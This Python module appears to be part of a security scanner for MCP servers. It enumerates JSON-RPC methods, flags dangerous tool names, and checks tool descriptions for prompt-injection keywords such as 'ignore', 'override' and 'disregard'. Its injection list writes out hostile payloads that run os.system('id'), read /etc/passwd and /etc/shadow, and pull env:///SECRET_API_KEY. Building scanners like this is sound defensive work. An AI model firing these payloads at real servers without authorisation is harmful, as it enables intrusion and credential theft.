"""Test MCP (Model Context Protocol) servers for security abuse vectors."""

import httpx
import json
import re


DANGEROUS_TOOL_PATTERNS = [
    r"(shell|bash|cmd|exec|system|run|sh\b)",
    r"(read_file|write_file|file_read|file_write|fs_|file_system)",
    r"(sql|query|database|db_|sqlite|mysql|postgres)",
    r"(network|http|fetch|request|curl|wget)",
    r"(eval|exec|compile|exec_code|run_code|python)",
    r"(env|environment|config|secret|token|key|credential)",
    r"(admin|sudo|root|privilege|escalat)",
    r"(delete|drop|remove|clear|truncat|destroy)",
    r"(send_email|email|smtp|mail)",
    r"(deploy|upload|publish|release)",
]

MCP_METHODS = [
    "tools/list",
    "tools/call",
    "resources/list",
    "resources/read",
    "prompts/list",
    "prompts/get",
]


async def mcp_abuse_test(target: str) -> dict:
    findings = []
    base = target.rstrip("/")
    mcp_url = base
    if not mcp_url.endswith("/mcp"):
        mcp_url = base + "/mcp"

    async with httpx.AsyncClient(timeout=15.0, verify=False) as client:
        # Test 1: Method enumeration — probe MCP endpoints
        for method in MCP_METHODS:
            try:
                payload = {"jsonrpc": "2.0", "method": method, "params": {}, "id": 1}
                resp = await client.post(mcp_url, json=payload)
                if resp.status_code == 200:
                    data = resp.json()
                    if "result" in data:
                        findings.append({
                            "test": "mcp_method_access",
                            "method": method,
                            "accessible": True,
                            "risk": "HIGH" if method in ["tools/call", "resources/read"] else "MEDIUM",
                        })
                        # If tools/list, analyze tools
                        if method == "tools/list" and "tools" in data.get("result", {}):
                            tools = data["result"]["tools"]
                            for tool in tools:
                                name = tool.get("name", "")
                                desc = tool.get("description", "")
                                combined = f"{name} {desc}".lower()
                                for pattern in DANGEROUS_TOOL_PATTERNS:
                                    if re.search(pattern, combined):
                                        findings.append({
                                            "test": "dangerous_tool_exposed",
                                            "tool": name,
                                            "matched_pattern": pattern,
                                            "risk": "CRITICAL",
                                        })
                                        break
            except (httpx.HTTPError, json.JSONDecodeError, Exception):
                pass

        # Test 2: JSON-RPC injection (parameter pollution in tool calls)
        injection_payloads = [
            {"jsonrpc": "2.0", "method": "tools/call", "params": {"name": "eval", "arguments": {"code": "__import__('os').system('id')"}}, "id": 2},
            {"jsonrpc": "2.0", "method": "tools/call", "params": {"name": "read_file", "arguments": {"path": "../../etc/passwd"}}, "id": 3},
            {"jsonrpc": "2.0", "method": "tools/call", "params": {"name": "run_command", "arguments": {"command": "cat /etc/shadow"}}, "id": 4},
            {"jsonrpc": "2.0", "method": "resources/read", "params": {"uri": "file:///etc/passwd"}, "id": 5},
            {"jsonrpc": "2.0", "method": "resources/read", "params": {"uri": "env:///SECRET_API_KEY"}, "id": 6},
        ]
        for payload in injection_payloads:
            try:
                resp = await client.post(mcp_url, json=payload)
                if resp.status_code == 200:
                    data = resp.json()
                    if "result" in data and data["result"]:
                        content = str(data["result"])
                        if len(content) > 10:
                            findings.append({
                                "test": "json_rpc_injection",
                                "payload": payload["method"],
                                "params": str(payload["params"])[:80],
                                "injected": True,
                                "risk": "CRITICAL",
                            })
            except Exception:
                pass

        # Test 3: Tool description injection (prompt injection via tool names)
        try:
            probe = {"jsonrpc": "2.0", "method": "tools/list", "params": {}, "id": 7}
            resp = await client.post(mcp_url, json=probe)
            if resp.status_code == 200:
                data = resp.json()
                tools = data.get("result", {}).get("tools", [])
                for tool in tools:
                    desc = tool.get("description", "")
                    if any(kw in desc.lower() for kw in [
                        "ignore", "system", "prompt", "you are", "instruction",
                        "override", "forget", "disregard",
                    ]):
                        findings.append({
                            "test": "tool_description_prompt_injection",
                            "tool": tool.get("name"),
                            "description_snippet": desc[:100],
                            "risk": "HIGH",
                        })
        except Exception:
            pass

    return {
        "target": target,
        "mcp_endpoint": mcp_url,
        "findings": findings,
        "vulnerable": any(f.get("risk") in ["CRITICAL", "HIGH"] for f in findings),
        "total_findings": len(findings),
    }
